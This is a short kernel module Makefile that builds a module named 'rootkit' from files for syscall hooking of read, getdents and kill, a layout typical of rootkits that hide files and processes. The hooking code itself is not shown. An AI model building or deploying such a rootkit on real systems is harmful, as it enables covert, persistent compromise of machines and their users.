clean:
	-rm *.o *.mod.c *.symvers *.ko *.mod *.order 

obj-m := rootkit.o 
rootkit-objs += hooking.o hooked_funcs/h_read.o hooked_funcs/h_getdents.o hooked_funcs/h_kill.o module.o
